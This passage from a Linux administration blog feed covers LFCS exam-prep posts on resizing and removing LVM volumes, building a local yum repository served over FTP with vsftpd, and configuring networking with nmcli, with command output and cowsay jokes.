<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>lvextend -L 190M -r /dev/vg-zero/inventory 
</span><span class='line'>  Rounding size to boundary between physical extents: 192.00 MiB.
</span><span class='line'>  Size of logical volume vg-zero/inventory changed from 180.00 MiB (45 extents) to 192.00 MiB (48 extents).
</span><span class='line'>  Logical volume vg-zero/inventory successfully resized.
</span><span class='line'>meta-data=/dev/mapper/vg--zero-inventory isize=512    agcount=6, agsize=8192 blks
</span><span class='line'>         =                       sectsz=512   attr=2, projid32bit=1
</span><span class='line'>         =                       crc=1        finobt=0 spinodes=0
</span><span class='line'>data     =                       bsize=4096   blocks=46080, imaxpct=25
</span><span class='line'>         =                       sunit=0      swidth=0 blks
</span><span class='line'>naming   =version 2              bsize=4096   ascii-ci=0 ftype=1
</span><span class='line'>log      =internal               bsize=4096   blocks=855, version=2
</span><span class='line'>         =                       sectsz=512   sunit=0 blks, lazy-count=1
</span><span class='line'>realtime =none                   extsz=4096   blocks=0, rtextents=0
</span><span class='line'>data blocks changed from 46080 to 49152</span></code></pre></td></tr></table></div></figure>


<p>This time I specified an absolute size instead of adding a certain amount.</p>

<h2>Removing LVs</h2>

<p>When you&rsquo;re done, you backed up your data or no longer need it, you can delete the LV. Unmount it first:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>umount -v /mnt/inventory/
</span><span class='line'>umount: /mnt/inventory (/dev/mapper/vg--zero-inventory) unmounted</span></code></pre></td></tr></table></div></figure>


<p>Remove the LV:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>lvremove /dev/vg-zero/inventory 
</span><span class='line'>Do you really want to remove active logical volume vg-zero/inventory? [y/n]: y
</span><span class='line'>  Logical volume "inventory" successfully removed</span></code></pre></td></tr></table></div></figure>


<p>Remove the VG:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>vgremove vg-zero 
</span><span class='line'>  Volume group "vg-zero" successfully removed</span></code></pre></td></tr></table></div></figure>


<p>Finally, also remove the PVs:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>pvremove /dev/sdb1 /dev/sdb2
</span><span class='line'>  Labels on physical volume "/dev/sdb1" successfully wiped.
</span><span class='line'>  Labels on physical volume "/dev/sdb2" successfully wiped.</span></code></pre></td></tr></table></div></figure>


<p>And don&rsquo;t forget to delete any remaining fstab entries.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ___________________________________
</span><span class='line'>/ That secret you've been guarding, \
</span><span class='line'>\ isn't.                            /
</span><span class='line'> -----------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[LFCS prep - Creating custom yum repositories]]></title>
    <link href="http://chousensha.github.io/blog/2018/01/17/lfcs-prep-creating-custom-yum-repositories/"/>
    <updated>2018-01-17T13:21:03-05:00</updated>
    <id>http://chousensha.github.io/blog/2018/01/17/lfcs-prep-creating-custom-yum-repositories</id>
    <content type="html"><![CDATA[<p>Setting up a local package repository is useful when you need to save bandwidth or you won&rsquo;t have access to internet. In this post we&rsquo;ll set up a local yum repository from the DVD source, install vsftpd from it, and then host the repository over FTP.</p>

<!-- more -->


<h2>Making a local repository from DVD</h2>

<p>I made a <strong>/mnt/cdrom</strong> directory where I can mount the DVD. Then check what you have in the drive:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>blkid /dev/sr0
</span><span class='line'>/dev/sr0: UUID="2016-10-19-18-32-06-00" LABEL="RHEL-7.3 Server.x86_64" TYPE="iso9660" PTTYPE="dos"</span></code></pre></td></tr></table></div></figure>


<p>Mount the ISO:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mount -t iso9660 -o ro /dev/sr0 /mnt/cdrom</span></code></pre></td></tr></table></div></figure>


<p>Copy the packages on the DVD to a directory:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mkdir -p /mnt/repos
</span><span class='line'>cp -rpv /mnt/cdrom/Packages/ /mnt/repos/rhel7</span></code></pre></td></tr></table></div></figure>


<p>Grab a cofee, this will take a while. When it&rsquo;s finished, create the repo from all the RPMS you copied:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>createrepo /mnt/repos/rhel7
</span><span class='line'>Spawning worker 0 with 4751 pkgs
</span><span class='line'>Workers Finished
</span><span class='line'>Saving Primary metadata
</span><span class='line'>Saving file lists metadata
</span><span class='line'>Saving other metadata
</span><span class='line'>Generating sqlite DBs
</span><span class='line'>Sqlite DBs complete</span></code></pre></td></tr></table></div></figure>


<p>Next, we need to create a conf file for the repo. These files should be placed in <code>/etc/yum.repos.d</code> and be of the format <em>name.repo</em>. For a listing of the repository options that you can set, see the <a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/system_administrators_guide/sec-configuring_yum_and_yum_repositories#sec-Setting_repository_Options">RedHat documentation</a></p>

<p>I defined a repo file that looks like this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat /etc/yum.repos.d/rhel7-local.repo 
</span><span class='line'>[rhel7-local]
</span><span class='line'>name=Local RHEL7 repository
</span><span class='line'>baseurl=file:///mnt/repos/rhel7
</span><span class='line'>enabled=1
</span><span class='line'>gpgcheck=0</span></code></pre></td></tr></table></div></figure>


<ul>
<li><p>[name] &ndash; this is a unique repository ID, and it should contain no spaces</p></li>
<li><p>name &ndash; a description of the repository</p></li>
<li><p>baseurl &ndash; location of the repository data. For local files: <code>file:///path/to/local/repo</code>. For <a href="HTTP:">HTTP:</a> <code><a href="http://path/to/repo">http://path/to/repo</a></code>. And for <a href="FTP:">FTP:</a> <code><a href="ftp://path/to/repo">ftp://path/to/repo</a></code></p></li>
<li><p>enabled &ndash; this 0 or 1 value specifies whether the repository is used by yum or not</p></li>
<li><p>gpgcheck &ndash; this 0 or 1 value specifies if yum will do a GPG signature check on the packages</p></li>
</ul>


<p>I cleared the yum cache and checked that my repo has been enabled:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>yum clean all
</span><span class='line'>Loaded plugins: langpacks, product-id, search-disabled-repos, subscription-manager
</span><span class='line'>Cleaning repos: rhel-7-server-rpms rhel-7-server-rt-beta-rpms rhel-7-server-rt-rpms rhel7-local
</span><span class='line'>Cleaning up everything
</span><span class='line'>yum repolist enabled | grep rhel7-local
</span><span class='line'>rhel7-local                          Local RHEL7 repository               4,751</span></code></pre></td></tr></table></div></figure>


<h2>Install vsftpd from local repo</h2>

<p>I disabled the other repositories and installed vsftpd from my local one:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>yum install -y vsftpd
</span><span class='line'>Loaded plugins: langpacks, product-id, search-disabled-repos, subscription-manager
</span><span class='line'>Resolving Dependencies
</span><span class='line'>--&gt; Running transaction check
</span><span class='line'>---&gt; Package vsftpd.x86_64 0:3.0.2-21.el7 will be installed
</span><span class='line'>--&gt; Finished Dependency Resolution
</span><span class='line'>
</span><span class='line'>Dependencies Resolved
</span><span class='line'>
</span><span class='line'>=============================================================================================================================================================================
</span><span class='line'> Package                               Arch                                  Version                                        Repository                                  Size
</span><span class='line'>=============================================================================================================================================================================
</span><span class='line'>Installing:
</span><span class='line'> vsftpd                                x86_64                                3.0.2-21.el7                                   rhel7-local                                169 k
</span><span class='line'>
</span><span class='line'>Transaction Summary
</span><span class='line'>=============================================================================================================================================================================
</span><span class='line'>Install  1 Package
</span><span class='line'>
</span><span class='line'>Total download size: 169 k
</span><span class='line'>Installed size: 348 k
</span><span class='line'>Downloading packages:
</span><span class='line'>Running transaction check
</span><span class='line'>Running transaction test
</span><span class='line'>Transaction test succeeded
</span><span class='line'>Running transaction
</span><span class='line'>  Installing : vsftpd-3.0.2-21.el7.x86_64                                                                                                                                1/1 
</span><span class='line'>  Verifying  : vsftpd-3.0.2-21.el7.x86_64                                                                                                                                1/1 
</span><span class='line'>
</span><span class='line'>Installed:
</span><span class='line'>  vsftpd.x86_64 0:3.0.2-21.el7                                                                                                                                               
</span><span class='line'>
</span><span class='line'>Complete!</span></code></pre></td></tr></table></div></figure>


<p>Start the FTP service and see that it&rsquo;s running:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>systemctl start vsftpd && systemctl status vsftpd
</span><span class='line'>● vsftpd.service - Vsftpd ftp daemon
</span><span class='line'>   Loaded: loaded (/usr/lib/systemd/system/vsftpd.service; disabled; vendor preset: disabled)
</span><span class='line'>   Active: active (running) since Mon 2018-01-15 15:21:54 EET; 35ms ago
</span><span class='line'>  Process: 6025 ExecStart=/usr/sbin/vsftpd /etc/vsftpd/vsftpd.conf (code=exited, status=0/SUCCESS)
</span><span class='line'> Main PID: 6026 (vsftpd)
</span><span class='line'>   CGroup: /system.slice/vsftpd.service
</span><span class='line'>           └─6026 /usr/sbin/vsftpd /etc/vsftpd/vsftpd.conf
</span><span class='line'>
</span><span class='line'>Jan 15 15:21:54 rhel7 systemd[1]: Starting Vsftpd ftp daemon...
</span><span class='line'>Jan 15 15:21:54 rhel7 systemd[1]: Started Vsftpd ftp daemon.</span></code></pre></td></tr></table></div></figure>


<p>If you have firewalld running, you have to allow vsftpd. First, chech the default zone:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>firewall-cmd --get-default-zone
</span><span class='line'>public</span></code></pre></td></tr></table></div></figure>


<p>Check if FTP is allowed:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>firewall-cmd --query-service=ftp
</span><span class='line'>no</span></code></pre></td></tr></table></div></figure>


<p>Add a rule to allow <a href="FTP:">FTP:</a></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>firewall-cmd --zone=public --add-service=ftp --permanent
</span><span class='line'>success</span></code></pre></td></tr></table></div></figure>


<p>Restart the firewall and check again:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>firewall-cmd --query-service=ftp
</span><span class='line'>yes</span></code></pre></td></tr></table></div></figure>


<p>Next, I copied the repository to the FTP folder in <code>/var/ftp/pub</code> and changed the ownership to <a href="ftp:">ftp:</a></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cp -r /mnt/repos/rhel7/ /var/ftp/pub/rhel7
</span><span class='line'>chown -R ftp:ftp /var/ftp/pub/rhel7/</span></code></pre></td></tr></table></div></figure>


<p>Check the SELinux context:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ls -lZ /var/ftp/pub/
</span><span class='line'>dr-xr-xr-x. ftp ftp unconfined_u:object_r:public_content_t:s0 rhel7</span></code></pre></td></tr></table></div></figure>


<p>And to see if everything works, FTP anonymously to the server and list the files:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ftp localhost
</span><span class='line'>Trying ::1...
</span><span class='line'>Connected to localhost (::1).
</span><span class='line'>220 (vsFTPd 3.0.2)
</span><span class='line'>Name (localhost:root): anonymous
</span><span class='line'>331 Please specify the password.
</span><span class='line'>Password:
</span><span class='line'>230 Login successful.
</span><span class='line'>Remote system type is UNIX.
</span><span class='line'>Using binary mode to transfer files.
</span><span class='line'>ftp&gt; ls
</span><span class='line'>229 Entering Extended Passive Mode (|||43989|).
</span><span class='line'>150 Here comes the directory listing.
</span><span class='line'>drwxr-xr-x    3 0        0              19 Jan 15 13:47 pub
</span><span class='line'>226 Directory send OK.
</span><span class='line'>ftp&gt; ls pub
</span><span class='line'>229 Entering Extended Passive Mode (|||35006|).
</span><span class='line'>150 Here comes the directory listing.
</span><span class='line'>dr-xr-xr-x    3 14       50         258048 Jan 15 13:49 rhel7</span></code></pre></td></tr></table></div></figure>


<p>Now you can create another repo file like before, but this time served over <a href="FTP:">FTP:</a></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat /etc/yum.repos.d/ftp-rhel7.repo 
</span><span class='line'>[ftp-rhel7]
</span><span class='line'>name=RHEL7 repository FTP
</span><span class='line'>baseurl=ftp://127.0.0.1/pub/rhel7
</span><span class='line'>enabled=1
</span><span class='line'>gpgcheck=0</span></code></pre></td></tr></table></div></figure>


<p>I disabled the local repository and only kept the FTP one:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>yum repolist
</span><span class='line'>Loaded plugins: langpacks, product-id, search-disabled-repos, subscription-manager
</span><span class='line'>ftp-rhel7                                                                                                                | 2.9 kB  00:00:00     
</span><span class='line'>ftp-rhel7/primary_db                                                                                                     | 3.8 MB  00:00:00     
</span><span class='line'>repo id                                                        repo name                                                                  status
</span><span class='line'>ftp-rhel7                                                      RHEL7 repository FTP                                                       4,751
</span><span class='line'>repolist: 4,751</span></code></pre></td></tr></table></div></figure>


<p>Install something to see it work:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>yum install -y squid
</span><span class='line'>[...]
</span><span class='line'>Installed:
</span><span class='line'>  squid.x86_64 7:3.5.20-2.el7                                                                                                                   
</span><span class='line'>
</span><span class='line'>Dependency Installed:
</span><span class='line'>  libecap.x86_64 0:1.0.0-1.el7                          perl-Digest.noarch 0:1.17-245.el7          perl-Digest-MD5.x86_64 0:2.52-3.el7         
</span><span class='line'>  squid-migration-script.x86_64 7:3.5.20-2.el7         
</span><span class='line'>
</span><span class='line'>Complete!</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _____________________________________
</span><span class='line'>/ Don't get stuck in a closet -- wear \
</span><span class='line'>\ yourself out.                       /
</span><span class='line'> -------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[LFCS prep - NetworkManager configuration]]></title>
    <link href="http://chousensha.github.io/blog/2018/01/11/lfcs-prep-networkmanager-configuration/"/>
    <updated>2018-01-11T13:31:50-05:00</updated>
    <id>http://chousensha.github.io/blog/2018/01/11/lfcs-prep-networkmanager-configuration</id>
    <content type="html"><![CDATA[<p>Today we&rsquo;ll look over configuring various network settings with <strong>nmcli</strong>, the command line tool for NetworkManager.</p>

<!-- more -->


<p>The first step is to understand how network configuration settings look. Inside the <code>/etc/sysconfig/network-scripts/</code> directory, you can find config files for your network interfaces, under the format of <strong>ifcfg-name</strong>. On my system, it looks like this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat ifcfg-Wired_connection_1 
</span><span class='line'>HWADDR=00:0C:29:47:D7:A8
</span><span class='line'>TYPE=Ethernet
</span><span class='line'>BOOTPROTO=dhcp
</span><span class='line'>DEFROUTE=yes
</span><span class='line'>IPV4_FAILURE_FATAL=no
</span><span class='line'>IPV6INIT=yes
</span><span class='line'>IPV6_AUTOCONF=yes
</span><span class='line'>IPV6_DEFROUTE=yes
</span><span class='line'>IPV6_FAILURE_FATAL=no
</span><span class='line'>IPV6_ADDR_GEN_MODE=stable-privacy
</span><span class='line'>NAME="Wired connection 1"
</span><span class='line'>UUID=8d922966-5be4-4633-a99d-71e836e2b31a
</span><span class='line'>ONBOOT=yes
</span><span class='line'>DNS1=8.8.8.8
</span><span class='line'>PEERDNS=yes
</span><span class='line'>PEERROUTES=yes
</span><span class='line'>IPV6_PEERDNS=yes
</span><span class='line'>IPV6_PEERROUTES=yes</span></code></pre></td></tr></table></div></figure>


<p>You can find a more complete overview of the options at <a href="https://www.centos.org/docs/5/html/Deployment_Guide-en-US/s1-networkscripts-interfaces.html">https://www.centos.org/docs/5/html/Deployment_Guide-en-US/s1-networkscripts-interfaces.html</a> , but from a glance at this file, we see the interface is an Ethernet device, it uses DHCP, it&rsquo;s set as the default route for both IPv4 and IPv6 traffic, it&rsquo;s activated at boot time, and also some other details like its MAC address and name.</p>

<p>nmcli is a very powerful tool, and you can press Tab to see options for its use at every stage.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmcli help
</span><span class='line'>Usage: nmcli [OPTIONS] OBJECT { COMMAND | help }
</span><span class='line'>
</span><span class='line'>OPTIONS
</span><span class='line'>  -t[erse]                                   terse output
</span><span class='line'>  -p[retty]                                  pretty output
</span><span class='line'>  -m[ode] tabular|multiline                  output mode
</span><span class='line'>  -c[olors] auto|yes|no                      whether to use colors in output
</span><span class='line'>  -f[ields] &lt;field1,field2,...&gt;|all|common   specify fields to output
</span><span class='line'>  -e[scape] yes|no                           escape columns separators in values
</span><span class='line'>  -a[sk]                                     ask for missing parameters
</span><span class='line'>  -s[how-secrets]                            allow displaying passwords
</span><span class='line'>  -w[ait] &lt;seconds&gt;                          set timeout waiting for finishing operations
</span><span class='line'>  -v[ersion]                                 show program version
</span><span class='line'>  -h[elp]                                    print this help
</span><span class='line'>
</span><span class='line'>OBJECT
</span><span class='line'>  g[eneral]       NetworkManager's general status and operations
</span><span class='line'>  n[etworking]    overall networking control
</span><span class='line'>  r[adio]         NetworkManager radio switches
</span><span class='line'>  c[onnection]    NetworkManager's connections
</span><span class='line'>  d[evice]        devices managed by NetworkManager
</span><span class='line'>  a[gent]         NetworkManager secret agent or polkit agent
</span><span class='line'>  m[onitor]       monitor NetworkManager changes</span></code></pre></td></tr></table></div></figure>


<p>Here we will go over a few examples:</p>

<h2>Device options</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmcli device help
</span><span class='line'>Usage: nmcli device { COMMAND | help }
</span><span class='line'>
</span><span class='line'>COMMAND := { status | show | set | connect | reapply | modify | disconnect | delete | monitor | wifi | lldp }
</span><span class='line'>
</span><span class='line'>  status
</span><span class='line'>
</span><span class='line'>  show [&lt;ifname&gt;]
</span><span class='line'>
</span><span class='line'>  set [ifname] &lt;ifname&gt; [autoconnect yes|no] [managed yes|no]
</span><span class='line'>
</span><span class='line'>  connect &lt;ifname&gt;
</span><span class='line'>
</span><span class='line'>  reapply &lt;ifname&gt;
</span><span class='line'>
</span><span class='line'>  modify &lt;ifname&gt; ([+|-]&lt;setting&gt;.&lt;property&gt; &lt;value&gt;)+
</span><span class='line'>
</span><span class='line'>  disconnect &lt;ifname&gt; ...
</span><span class='line'>
</span><span class='line'>  delete &lt;ifname&gt; ...
</span><span class='line'>
</span><span class='line'>  monitor &lt;ifname&gt; ...
</span><span class='line'>
</span><span class='line'>  wifi [list [ifname &lt;ifname&gt;] [bssid &lt;BSSID&gt;]]
</span><span class='line'>
</span><span class='line'>  wifi connect &lt;(B)SSID&gt; [password &lt;password&gt;] [wep-key-type key|phrase] [ifname &lt;ifname&gt;]
</span><span class='line'>                         [bssid &lt;BSSID&gt;] [name &lt;name&gt;] [private yes|no] [hidden yes|no]
</span><span class='line'>
</span><span class='line'>  wifi hotspot [ifname &lt;ifname&gt;] [con-name &lt;name&gt;] [ssid &lt;SSID&gt;] [band a|bg] [channel &lt;channel&gt;] [password &lt;password&gt;]
</span><span class='line'>
</span><span class='line'>  wifi rescan [ifname &lt;ifname&gt;] [[ssid &lt;SSID to scan&gt;] ...]
</span><span class='line'>
</span><span class='line'>  lldp [list [ifname &lt;ifname&gt;]]</span></code></pre></td></tr></table></div></figure>


<ul>
<li>show device status</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmcli dev status
</span><span class='line'>DEVICE      TYPE      STATE      CONNECTION         
</span><span class='line'>virbr0      bridge    connected  virbr0             
</span><span class='line'>enp0s3      ethernet  connected  Wired connection 1 
</span><span class='line'>lo          loopback  unmanaged  --                 
</span><span class='line'>virbr0-nic  tun       unmanaged  --          </span></code></pre></td></tr></table></div></figure>


<ul>
<li>list device details</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmcli dev show enp0s3 
</span><span class='line'>GENERAL.DEVICE:                         enp0s3
</span><span class='line'>GENERAL.TYPE:                           ethernet
</span><span class='line'>GENERAL.HWADDR:                         00:0C:29:47:D7:A8
</span><span class='line'>GENERAL.MTU:                            1500
</span><span class='line'>GENERAL.STATE:                          100 (connected)
</span><span class='line'>GENERAL.CONNECTION:                     Wired connection 1
</span><span class='line'>GENERAL.CON-PATH:                       /org/freedesktop/NetworkManager/ActiveConnection/0
</span><span class='line'>WIRED-PROPERTIES.CARRIER:               on
</span><span class='line'>IP4.ADDRESS[1]:                         192.168.241.130/24
</span><span class='line'>IP4.GATEWAY:                            192.168.241.2
</span><span class='line'>IP4.DNS[1]:                             192.168.241.2
</span><span class='line'>IP4.DNS[2]:                             8.8.8.8
</span><span class='line'>IP4.DOMAIN[1]:                          localdomain
